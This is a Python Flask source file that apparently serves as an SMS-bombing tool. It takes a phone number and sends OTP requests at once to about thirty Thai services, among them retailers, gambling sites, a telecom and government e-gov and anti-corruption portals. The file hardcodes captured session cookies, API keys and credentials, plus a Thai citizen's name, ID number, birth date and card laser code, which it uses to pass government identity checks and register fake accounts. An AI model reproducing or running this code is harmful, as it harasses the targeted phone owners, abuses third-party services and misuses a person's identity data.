import asyncio
import aiohttp
import os
from flask import Flask, jsonify, request,render_template
from requests import Session
from re import search
import random
import string
import os
import requests



app = Flask(__name__, static_url_path='/static')


#userangent
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
th = "66" #addstring
#api for request OTP
pizza_api = 'https://api2.1112.com/api/v1/otp/create'
graph_api = 'https://graph.firster.com/graphql'
kaidee_api = 'https://api.kaidee.com/0.20/member/generate_otp'
bigc_api = 'https://openapi.bigc.co.th/customer/v1/otp'
aha_url = 'https://rest-prod-aha.evergent.com/aha/createOTP'
itas_url = 'https://itas.nacc.go.th/go/reotpsms'
lb_api = 'https://lb-api.fox83-sy.xyz/api/otp/register'
makro_api = "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register"
lcbet_api = "https://api-players.cueu77778887.com/register-otp"
ufa_api = "https://api-players.cueu77778887.com/register-otp"
punpro_api = "https://game.punpro777.com/api/otp"
lotus_api = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp"
egovverify_api= "https://connect.egov.go.th/Account/VerifyLaserCode"
egovotp_api = "https://connect.egov.go.th/Account/RequestOtpRegister"
ch3_api = "https://api-sso.ch3plus.com/user/request-otp"
carsome_api = "https://www.carsome.co.th/website/login/sendSMS"
crazy_rabbit_api = "https://crazy-rabbit-api.carro.sg/api/v1/rabbit/th/contacts/otp"
paysoon_api = "https://api.paysoon.net/paysoon/api/users/register"
icq_api = "https://u.icq.net/api/v92/rapi/auth/sendCode"
thwatsadu_api = "https://www.thaiwatsadu.com/api/registration_initiate"
tfg_api = "https://www.tgfone.com/signin/otp_chk"
kai_api = "https://www.kaitorasap.co.th/api/index.php/register/"
mflow_api = "https://api.mflowthai.com/otpservice/api/v1/otp"
hoo_api ="https://www.oohoo.io/register/phone"
deve_api = "https://www.deves.co.th/umbraco/Surface/Register/RequestRegister"
slot88_api = "https://api-players.cueu77778887.com/register-otp"
pgsoft_api = "https://pgsoft.pgslot.in/api/otp"
sgame_api = "https://ap.9sgame.cc/api/RegisterService/RequestOTP"
theconcert_api = "https://www.theconcert.com/rest/request-otp"
oneplaybet_api = "https://api-member.oneplaybet.com/user/register/otp"

#payload 
egovfypayload = {
            "transactionId": "",
            "firstName": "สุณี",
            "lastName": "โสภานะ",
            "citizenId": "3500400384787",
            "dateOfBirth": "19680317",
            "laserCode": "ME1-1308389-22",
            "middleName": ""
    }
#headers for urls_api 
carsome_headers = {"content-type":"application/json", "cookie":"cookieyesID=ZDBZUzBnMThVR3BiZmlKb1BzMzBsT0wwN2NjNU50SU8; amp_4b05bb=158ztW6pX40tKr0FphVgTB...1h46v7teq.1h46v7teq.0.0.0; __cf_bm=MRWGbtihp.u.4GRZWANEpuPSUPmKdNnP00fpCi1Nx8s-1688156240-0-AZHMPpcbNwbrTCujlMpF73QPfUaDkflU/KADysT4QpUNo7lxf1QH0gZ6sMa36zC8+L2JWM325g199ADoElfICtI=; tml_s=ca46197f-e1e1-44cc-a201-d7d262046258; tml_t=e7e55564-4399-43fc-82a8-473cff2fd6fa; _tt_enable_cookie=1; _ttp=2qooPrVE4bjYb7lTWcwQRc8G6_b; cky-consent=no; cookieyes-necessary=yes; cookieyes-functional=no; cookieyes-analytics=no; cookieyes-performance=no; cookieyes-advertisement=no; cookieyes-other=no; ajs_anonymous_id=e9c6e040-aaff-4922-966e-77d1ba2d11c4; moe_uuid=6e997362-ae95-4f24-a69d-3e863b9374dc", "host":"www.carsome.co.th", "origin":"https://www.carsome.co.th", "referer":"https://www.carsome.co.th/", "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}

aha_headers = {"Content&Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}

itas_headers = {"Content-Type": "application/x-www-form-urlencoded", "cookie":"Stat=bb8d36ef-932c-4c73-834a-c2bda91bb2cc; font-size=14; .AspNetCore.Antiforgery.o1OHiWVDMSY=CfDJ8EcGUROYFS1LgZB7Egfc9FvtEQQqmj1vNBR84sECm3f3oU48rRu9omPL8PAUCmV6fogikw5ab3wKtu-t_cMHWBDoXyz7bwM_gmBJa2cQBUCOftr2hKcj0pVE6wq5bvJNVCn7oudzDc8XGb_osX7o4Dk", "host":"itas.nacc.go.th", "origin":"https://itas.nacc.go.th", "referer":"https://itas.nacc.go.th/go/verifyotpeit?tokenId=3627935&tokenValue=039c9eff-9c56-4f4e-ab4f-6c41d4544215&departmentId=261", "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "x-requested-with":"XMLHttpRequest"}

kaidee_headers={"content-type":'application/json',"host":"api.kaidee.com", "origin":"https://rod.kaidee.com","publictoken":"lBOlvDZA2IcG3E1St6gwTTAETIXvZ2XCGnyE+z+2sck=","referer":"https://rod.kaidee.com/", "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" }

lcbet_headers = {"content-type":'application/json',"host":"api-players.cueu77778887.com","origin":'https://m.lcbet168.com',"referer": "https://m.lcbet168.com/","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","x-exp-signature":"609caede5a67e5001164b89d","x-session":"66555a88-7fef-4749-aacf-93c68c6c444a"}

ufa_hearders = {"content-type":'application/json', "cookie":'__cf_bm=njxlEobeI2ybPFv0yBGaDQqi3ich38h.cZSb6180Ap8-1682113207-0-ATwL63Aus7CwIIwKzGytrZuiXYKn4lBF1fqy2gHBZYsIIELNDJBvWOKRttr/WNzqZmmTFskDj5YeM0d0DKNKapX+BJAIteh+9tZE8UF55ZnM; auth.strategy=local; auth.redirect=%2F; nuxt-session-id=s%3A6B-djjTnqVq7VCK93hzWJCtDegsw1B2x.nOL4vlM65ADTXL2C68AeBGyUQXZ8NEts%2BO3Rz67wK8o; i18n_redirected=th; _ga=GA1.2.2053074436.1682113215; _gid=GA1.2.1951337772.1682113215; _gat=1; _fbp=fb.1.1682113215843.265951192', "User-Agent": useragent, "x-exp-signature":'628b42b76ce1e0001265bbdd', "x-session":'ec49400e-5a29-4331-8d4b-40fe74b50f28',  }

egov_headers = {
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "cookie":'.AspNetCore.Antiforgery.KxKoEZ_nda0=CfDJ8EsazHDqAO1IhrtWXP8fd_LmeieFG1N6AStQnx6iqfNJIRU-a26PAZBLbheDfUam86K0qMO5N31yRz1q_WgTy1dsOPwjoI-iePIV1HWSh1ZZUYQalBrJcCw5onENHr2mGqD7t7pMONTVYokKUTjA4dI; cwc_consent_Gfb1TkL4TwTK4RsZNEyvKYKi=eyJjb25zZW50VmVyc2lvbiI6IjYiLCJwdXJwb3NlcyI6eyIxMDY3OSI6ImluZm9ybWVkIiwiMTA2ODAiOiJhbGxvdyIsIjEwNjgxIjoiYWxsb3cifSwic2Vzc2lvbl9pZCI6IjkxM2NmNDlmLTUxMmYtNDM2ZS1hNzU1LTkzYjdjMDg1ZDJlMSIsInNjcmlwdFZlcnNpb24iOjEsImxhc3RVcGRhdGVkIjoiMTY4ODIwNTQ3MDY0MCJ9; _ga_PQPMXPK6F2=GS1.1.1688205469.1.0.1688205469.60.0.0; _ga_PQPMXPK6F2=GS1.1.1688205469.1.0.1688205469.60.0.0; _ga=GA1.1.1988909495.1688205469; _ga=GA1.1.1988909495.1688205469; _ga=GA1.1.1988909495.1688205469; .AspNetCore.Antiforgery.Ewdfj2Mej3Q=CfDJ8EsazHDqAO1IhrtWXP8fd_KqL_ahrMYRpj4eo5UttKBesq9OtlFe0oUwGvuazmwykfB8IbiRivSHwJczsHoIR6GgkwX_tRf6YEF0day2Psy5BOxQcKZ5aMXUqFOiTqh5oojV16v7ITHIpYhMDBOhWEA; _ga_PQPMXPK6F2=GS1.1.1688309362.2.1.1688309384.38.0.0',
  "host":'connect.egov.go.th',
  "origin":'https://connect.egov.go.th',
  "user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
}
paysoon_headers = {
"apikey":"F1kFAbG25a",
"Content-Type": "application/json",
"host":'api.mflowthai.com',
"origin":'https://app.paysoon.net',
"referer":'https://app.paysoon.net/',
"useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
}
icq_headers = {"Content-Type": "application/json","host":'u.icq.net',"origin":'https://web.icq.com',"referer":'https://web.icq.com/',"user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}

thwatsadu_headers = {"Content-Type": "application/json","cookie":"CUSTREF=2352096823; __cfruid=01b745e24c38e991ec28d4d25a5e6e0ba8f584be-1681061349; _gcl_au=1.1.120738755.1681061347; _hjSessionUser_1913147=eyJpZCI6IjdlZjJiNjU0LWNmOTAtNTFlOC05MzVlLTJkZDA0ZjBmZWI3NiIsImNyZWF0ZWQiOjE2ODEwNjEzNDczNTIsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_1913147=0; _hjSession_1913147=eyJpZCI6IjdiZmJlMmIwLTVhYWItNDMwOC05ZjI0LWM0NGJmOGJlYjczOCIsImNyZWF0ZWQiOjE2ODEwNjEzNDczNjIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga=GA1.2.1381601700.1681061347; _gid=GA1.2.1646449566.1681061347; _gat_UA-21952226-1=1; _gat_UA-21952226-2=1; _fbp=fb.1.1681061347686.2074362564; __cf_bm=piHDnqKhPq96cUN748FUDoHq706GZ23pHPw1BWt9Vpo-1681061353-0-AdBymOrTxTjs1iUTqT7im5ppXnrpPQyJh968cIukC/O24rP7S33mcOB62z8Y67RXTib95jADOLhaeH82OxWQ2dUa7xJmSql5mGO+wwjHNNe4ZWt701OLnrJLRd5qwsjGIuc+jEcA2ANX+CQYvvuXKcpDB15KtaY7bFrAvHcZINxS; _ga_Y9JGQ98NXG=GS1.1.1681061347.1.1.1681061356.51.0.0","host":'www.thaiwatsadu.com',"newrelic":'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0MTQ4NDkiLCJhcCI6IjYwMTMxNTM4OCIsImlkIjoiNDY5MzE4YTk3NGY3ZDYxMSIsInRyIjoiNzUxNmY1MmZkOTY1MDQ2NzMzOGEzMmZlMmEwNzZhYjAiLCJ0aSI6MTY4MTA2MTM2ODM1NH19',"origin":'https://www.thaiwatsadu.com',"referer":'https://www.thaiwatsadu.com/th/register',"traceparent":'00-7516f52fd9650467338a32fe2a076ab0-469318a974f7d611-01',"tracestate":'3414849@nr=0-1-3414849-601315388-469318a974f7d611----1681061368354',"user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}

tfg_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","cookie":'PHPSESSID=5485f89413170398e84423c6a6d1a1fa95bea08a; _gid=GA1.2.1086665850.1681137217; _gat_gtag_UA_163796127_1=1; _gcl_au=1.1.1306406942.1681137217; _ga_1QLSWVZFZ2=GS1.1.1681137217.1.0.1681137217.0.0.0; _ga=GA1.1.158754160.1681137217; _fbp=fb.1.1681137217157.769947478; G_ENABLED_IDPS=google',"host":'www.tgfone.com',"origin":'https://www.tgfone.com',"referer":'https://www.tgfone.com/s',"user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
   
kai_headers ={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","cookie":'PHPSESSID=tmhifrh1ok7kdfqm66i04svpk4; _gid=GA1.3.927168482.1681136922; _gac_UA-141105037-1=1.1681136922.EAIaIQobChMIqPH4h8Of_gIVy4NLBR0BLQOuEAAYAyAAEgJZbfD_BwE; G_ENABLED_IDPS=google; userim_log=https%3A%2F%2Fwww.kaitorasap.co.th%2Fassets%2Fimages%2Fuser.png; _gat_gtag_UA_141105037_1=1; _ga=GA1.1.386529673.1681136922; _ga_RCNY3422JZ=GS1.1.1681136921.1.1.1681138061.0.0.0',"host":'www.kaitorasap.co.th',"origin":'https://www.kaitorasap.co.th',"referer":'https://www.kaitorasap.co.th/login/',"user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}

mflow_hearders = {
  "accesskey":'eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRlIjoiMjAyMy0wNC0xMVQwMToxMTowMS45ODYiLCJzdWIiOiJhY2Nlc3NrZXkiLCJ4LW1mbG93IjoiMTAuMy4xMC4yNTQiLCJpc3MiOiJMekpRUTFXQzlmMk9oa1FvMmxXdmFVc2p0ZUpseXBZbyIsInNvdXJjZSI6IldFQiIsImlhdCI6MTY4MTE1MDI2MX0.1m8k6hFgDm_YBx7JkMQgclnND3nYfkOeZtplsUS51yg',
  "Content-Type": "application/json;charset=UTF-8",
  "host":'api.mflowthai.com',
  "language":'TH',
  "origin":'https://mflowthai.com',
  "requestdate":'2023-04-11T01:11:06.582',
  "referer":'https://mflowthai.com/',
  "source":'WEB',
  "system":'M00000',
  "transactionid":'T202304110111067873685ed2bb0',
  "useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
}

hoo_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","cookie":"_gcl_au=1.1.154901351.1688203857; _gid=GA1.2.1657285874.1688203857; __lt__cid=3dd114c7-8bf2-4a15-9393-2de00d31974a; _hjSessionUser_2986867=eyJpZCI6ImQ5MDk2Mzc2LWI5YjQtNTZhOC05OGU2LWU3NTBhZDU0ZTE2YiIsImNyZWF0ZWQiOjE2ODgyMDM4NTY4MTksImV4aXN0aW5nIjp0cnVlfQ==; _fbp=fb.1.1688203857490.1985771970; _tt_enable_cookie=1; _ttp=Gz5hp6o1arRhQoI8Z43sFjyLxI0; _hjIncludedInSessionSample_2986867=0; _hjSession_2986867=eyJpZCI6IjJhMTZhMjNjLTgxNmYtNDczNi04ZjY2LTZjZjI5M2I2ZDllYyIsImNyZWF0ZWQiOjE2ODgyNzc5MjI3MzUsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __lt__sid=133361ed-0a47820b; _gat_UA-60726714-2=1; _ga_2GJW3XLL12=GS1.1.1688277923.2.1.1688277931.52.0.0; _ga=GA1.1.1302928282.1688203857; _ga_JBQKW6NJBW=GS1.2.1688277924.2.1.1688277931.53.0.0; XSRF-TOKEN=eyJpdiI6IjFNQ1lObm9FQmdWQlA4MmIzZ3E0TWc9PSIsInZhbHVlIjoiVHpmVVNRdWJpaTBvdytIcXl6MDF5YnQra296M2pPMURSajhQc0xLSWhhZEQ4ekhTT2FnS1FhV01BSGN3eWRxWWd5TDJwWjlsSW5PNGNDVWZ4c1dISXc9PSIsIm1hYyI6ImY3MDVlN2UwZjQ2NDhmYzYwN2IzMmVmZGVhNjE3YzI3OTRjM2Y0ZjhkNmU5M2JlNDE3NTFlYjYwYTQ4MmY1ZGUifQ%3D%3D; oohoo_session=eyJpdiI6InFcL1wvcjlXU0hLTXNYbUF3RTdpNmJqUT09IiwidmFsdWUiOiJXYkx2OWhROVBWQ0pLN0RNWkZNT1Z1WndBeDEzUHhaRzNIcU5ENVRxSURkT0Q3OUFxVTc4Y1B6WFJGMmNxTlNQdkN2YnJoOUVLRVZvTHpxMzMrZ3czdz09IiwibWFjIjoiMjI3NGYyYzhhNzYxMThjZThhYWQ2MTI5Y2FjZDY0MjhlMzZmYTIwMjE2YWRlZGY0NzQ5NGRhN2MxY2MwNjZhNSJ9","host":'www.oohoo.io',"origin":'https://www.oohoo.io', "referer":'https://www.oohoo.io/register',"useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}

deve_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "cookie":"ASP.NET_SessionId=kw4dxd1qtwutsvq35ryv5x1p; visid_incap_1615401=K11e4dGjRiuGG0fLQxa4SJjzn2QAAAAAQUIPAAAAAAB+SnJ2gLjD//DA4bUMKL0A; nlbi_1615401=xMOuQ6srTzxWIqcPNIT5EAAAAACCcB/N9rRIZkhkbDNuRJhA; incap_ses_411_1615401=K5MzX4LCzHhjiw4NQCu0BZjzn2QAAAAAVulNNBTI3Zhqj57HPkzhdw==; _ga=GA1.1.650781166.1688204183; _ga_JNYTL4Z36Y=GS1.1.1688204182.1.1.1688204315.0.0.0","host":'www.deves.co.th', "origin":'https://www.deves.co.th', "referer":'https://www.deves.co.th/th/register-account/',"useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}

slot88_headers = {"content-type":'application/json',"host":"api-players.cueu77778887.com","origin":"https://m.slothub888.com","referer":"https://m.slothub888.com/","x-exp-signature":'6117c21b10c1010011d538ef',"x-session":'ed1d76c3-f32e-4b64-bc06-14c5ac951d45'}

pgsoft_headers = {'content-type':'application/json', 'cookie':'_ga=GA1.1.977995847.1682201468; _ga_61HQCF4LXP=GS1.1.1682201467.1.0.1682201469.0.0.0; auth.strategy=local', 'host':'pgsoft.pgslot.in', 'origin':'https://pgsoft.pgslot.in', 'referer':'https://pgsoft.pgslot.in/', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',}

sgame_headers = {"content-type":'application/json; charset=UTF-8', 'host':'ap.9sgame.cc', 'origin':'https://9slotgame.net', 'referer':'https://9slotgame.net/', "user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}

konvy_headers = {"cookie":"referer=https%3A%2F%2Fwww.konvy.com%2F; PHPSESSID=vqrg8frq4blndbfgq30icuqr91; f34c_rb_banner8249=1; f34c_new_user_view_count=%7B%22count%22%3A1%2C%22expire_time%22%3A1688239942%7D; _gcl_au=1.1.841575493.1688153543; _gid=GA1.2.1545296861.1688153543; _ga=GA1.1.960480284.1688153543; _tt_enable_cookie=1; _ttp=11-NvF5NTU2x9PU9F-o9njzyWov; _fbp=fb.1.1688153543611.800754719; cto_bundle=1vgjrl9rcEtkaUJpTUg1dlBVMXI5TWhrWlFmZDBoc2VtblA2V3gwMWNVd003MmlWdm4xVUVqbXg3RXFtM0pPaiUyRnJHMngydFBXVkpjY0hWZzBOTkdzZzh1Q25ManN4UyUyRmJaTVllc2s4dHBMNTdpQkxlVEk4UXp6UmlKZUtxanFaZVN3ek9lMnF5V0FhR3ZRSzlmeW9mR2k2ZDBRJTNEJTNE; referer=https%3A%2F%2Fwww.konvy.com%2F; _ga_Z9S47GV47R=GS1.1.1688153543.1.1.1688153610.57.0.0", "host":"www.konvy.com", "referer":"https://www.konvy.com/", "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "x-requested-with":"XMLHttpRequest"}

oneplaybet_hedaers = {"host":"api-member.oneplaybet.com","origin":"https://m.dolfin88.com","referer":"https://m.dolfin88.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",}
            
async def make_async_request(session, request_data, ):
    url = request_data.get('url')
    method = request_data.get('method', 'POST')
    headers = request_data.get('headers')
    json_data = request_data.get('json')
    data = request_data.get('data')

    async with session.request(method, url, headers=headers, json=json_data, data=data) as response:
        response.raise_for_status()
        content_type = response.headers.get('Content-Type')
        if content_type == 'application/json':
            return await response.json()
        else:
            return await response.text()

async def process_batch(session, batch):
    tasks = []
    for request_data in batch:
        tasks.append(make_async_request(session, request_data))
    return await asyncio.gather(*tasks, return_exceptions=True)

async def make_requests(mobile,id):
       
       
    #slot88 payload request otp
    slot88_payload = {
  "agent_register": "6117c25510c1010011d549cf",
  "brands_id": "6117c21b10c1010011d538ef",
  "tel": f"{mobile}",
  "token": "",
  "captcha_id": "",
  "captcha_output": "",
  "gen_time": "",
  "lot_number": "",
  "pass_token": ""
}
    
    #deve payload request otp
    deve_payload = {
                    "firstname":"สุณี",
                    "lastname":"โสภา",
                    "idCard":"3500400384787",
                    "mobileNumber":mobile,
                    "usernameID":"facefakeone1917@gmail.com"
                }
    

    th = "66" #addstring
    #iq_payload
    icq_payload ={"reqId":"17516-1681058593","params":{"phone":f"{th+mobile[1::]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
    
    #egovverifypayload
    egovverify_payload ={
    "transactionId":"",
    "firstName":"สุณี",
    "lastName":"โสภานะ",
    "citizenId":"3500400384787",
    "dateOfBirth":"19680317",
    "laserCode":"ME1-1308389-22",
    "middleName":""
}
    #eggovotprequest
    
    # lotuspayloadotp
    lotus_payload = {"mobile_phone_no": mobile}
    
    # Create OTP request for pumpro API
    punpro_payload = {
    "phone_number": mobile,
    "register_type": ""
    }
    # Create OTP request for UFA API
    ufa_payload ={
  "agent_register": "609caeeba3cc590011d09412",
  "brands_id": "609caede5a67e5001164b89d",
  "tel": mobile,
  "token": "",
  "captcha_id": "",
  "captcha_output": "",
  "gen_time": "",
  "lot_number": "",
  "pass_token": ""
    }
    # Create OTP request for LCBET API
    lcbet_payload = {
  "agent_register": "609caeeba3cc590011d09412",
  "brands_id": "609caede5a67e5001164b89d",
  "tel": mobile,
  "token": "",
  "captcha_id": "",
  "captcha_output": "",
  "gen_time": "",
  "lot_number": "",
  "pass_token": ""
    }
    # Create OTP request for Makro API
    makro_payload = {"username": f"{mobile}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}
    # Create OTP request for kaidee  API
    kaidee_payload = {
  "mobile": f"{mobile}",
  "otp_type": 1
}
    
    # Create OTP request for AHA API
    aha_payload = {"CreateOTPRequestMessage": {"channelPartnerID": "AHA_ROW","apiUser": "ahaapiuser","apiPassword": "Aha@p!u$#r123#$","country": "TH","mobileNumber": mobile[1::]}}

    # Create OTP request for ITAS API
    itas_payload = {
        "phone": mobile
    }
    # Create OTP request for lb Api
    lb_payload = {
        "applicant": mobile,
        "serviceName": "fox888.com"
    }
    # Create OTP request for bigc Api
    bigc_payload = {"phone_no":mobile}
    
  
    egov_payload = {"mobile": f"{mobile}", "transactionId": f"{id}"}

    # Add other API URLs here...
    
    apiname  = [
        {
            #1
  
            'url': "https://api2.1112.com/api/v1/otp/create",
            'headers': {"Content-Type": "application/json"},
            'json': {"phonenumber": f"{mobile}", "language": "th"}
        },
       {
            #2

            'url': graph_api,
            'json': {
                "operationName": "sendOtp",
                "variables": {
                    "input": {
                        "mobileNumber": mobile[1:],
                        "phoneCode": "THA-66"
                    }
                },
                "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
            }
        },
        {
            #3
            'url': "https://api.kaidee.com/0.21/member/generate_otp",
            'headers': kai_headers,
            'json': {"mobile": f"{mobile}","otp_type": 1}
        },
        {   
             #4
            'url': bigc_api,
            'headers': aha_headers,
            'json': bigc_payload
        },
        {
             #5
            'url': aha_url,
            'headers': aha_headers, 
            'json': aha_payload
        },
        {
             #6
            'url': itas_url,
            'headers': itas_headers,
            'data': {"phone": mobile}
        },
        {
             #7
            'url': makro_api,
            'headers': {"User-Agent": useragent},
            'json': makro_payload,
        },
        {
            #8
            'url': lcbet_api,
            'headers': lcbet_headers,
            'json': lcbet_payload
        },
        {
            #9
            'url': ufa_api,
            'headers': ufa_hearders,
            'json': ufa_payload
        },
        {
            #10
            'url': punpro_api,
            'headers': aha_headers,
            'json': punpro_payload
        },
        {
            #11
            'url': lotus_api,
            'headers': aha_headers,
            'json': lotus_payload
        },
        {
            #12
            'url': ch3_api,
            'headers': aha_headers,
            'json': {"tel": f"{mobile}","type": "login"}
        },
        {
            #13
            'url': carsome_api,
            'headers': carsome_headers,
            'json': {"username":f"{mobile}","optType":0}
        },
        {
            #14
            'url': crazy_rabbit_api,
            'headers': aha_headers,
            'json': {"phone": f"{mobile}","type": "sms","locale": "th","g_recaptcha_action": "th__requestOtp"}
        },
        {
            #15
            'url': paysoon_api,
            'headers': paysoon_headers,
            'json': {"email": "facefakeone99@gmail.com","phone": f"{mobile}","password": "Hakko@2019","role": "supplier"}
        },
        {
            #16
            'url': icq_api,
            'headers': icq_headers,
            'json': icq_payload
        },
        {
            #17
            'url': thwatsadu_api,
            'headers': thwatsadu_headers,
            'json': {"on": {"country": "66","value": f"{mobile}"},"type": "mobile"}
        },
        {
            #18
            'url': tfg_api,
            'headers': tfg_headers,
            'data': {"mobile":f'{mobile}',"type_otp":'3'}
        },
        {
            #19
            'url': mflow_api,
            'headers': mflow_hearders,
            'json': {"type": 23,"mobile": f"{mobile}"}
        },       
        {
          #20  
            'url': hoo_api,
            'headers': hoo_headers,
                'data': {"_token": "lEZONTR0QRTPjo2CBiCKJzbXIFb8UrpKUCaa9oG8","phone": f"{mobile}"}
        },
        {
          #21
            'url': deve_api,
            'headers': deve_headers,
            'data': deve_payload
        },
        {
          #22 
            'url': slot88_api,
            'headers': slot88_headers,
            'json': slot88_payload
        },
        {
          #23
            'url': pgsoft_api,
            'headers': pgsoft_headers,
            'json': {"phone_number": f"{mobile}","register_type": ""}
        },
        {
          #24
            'url': sgame_api,
            'headers': sgame_headers,
            'json': {"Phone": f"{mobile}"}
        },
        {
          #25
            'url': oneplaybet_api,
            'headers': oneplaybet_hedaers,
            'json':{"mobileNumber":f"{mobile}","partnerKey":"XPBBKKJPADPJ"}
        },
        {
            #26
            'url': f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{mobile}",
            'method':'PUT',
            'headers': {"Content-Type": "application/json"},
            'json':{"method": "forgot-password"} 
        },
        {
            #27
            'url': "https://api2.1112.com/api/v1/popup-email",
            'headers':{"Content-Type": "application/json;charset=UTF-8"},
            'json':{"_method": "post","type": "phone_number","email": "","phone_number": f"{mobile}"}
        },
        
    

        # Add other requests here...
    ]
    response_data = {}
    
    async with aiohttp.ClientSession() as session:
        batch_size = 30  # Adjust batch size based on your requirements
        for i in range(0, len(apiname), batch_size):
            batch = apiname[i:i+batch_size]
            responses = await process_batch(session, batch)
            for j, response in enumerate(responses):
                if isinstance(response, Exception):
                    error_message = f"Request failed with exception: {str(response)}"
                    response_data[f'error_{i+j}'] = error_message
                else:
                    response_data[f'response_{i+j}'] = response
    try:
        payloadid = {
    "transactionId":"",
    "firstName":"สุณี",
    "lastName":"โสภานะ",
    "citizenId":"3500400384787",
    "dateOfBirth":"19680317",
    "laserCode":"ME1-1308389-22",
    "middleName":""
    }
    # Make request to the egove API for VerifyLaserCode
        response_id = requests.post("https://connect.egov.go.th/Account/VerifyLaserCode", data=payloadid, headers=egov_headers)
        response_id.raise_for_status()  # Raise an exception if the response status code indicates an error
        id = response_id.json()['ver_tran_id']
        print(id)
        egovtp= requests.post("https://connect.egov.go.th/Account/RequestOtpRegister", data={"mobile": f"{mobile}","transactionId":f"{id}" }, headers=egov_headers)
        response_data['EGOV_response'] = egovtp.json()
    except requests.exceptions.RequestException as err:
        print("Request error:", err)
        response_data['EGOV_error'] = str(err)
        return jsonify(response_data)
    except Exception as err:
        print("Error:", err)
        response_data['EGOV_error'] = str(err)
        return jsonify(response_data)
    try:
        # Make request to Ais_api
        session = Session()
        ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
        Ais_response = session.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW", data=f"msisdn={th+mobile[1::]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
        Ais_response.raise_for_status()
        response_data['Ais_response'] = Ais_response.json()
    except requests.exceptions.HTTPError as err:
        print("AIS ERROR")
        response_data['Ais_error'] = str(err)

    return jsonify(response_data)
    

#run on site
@app.route('/api/requestsotp', methods=['POST'])
def main():
    
    mobile = request.json.get("phone")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(make_requests(mobile,id))
    return result
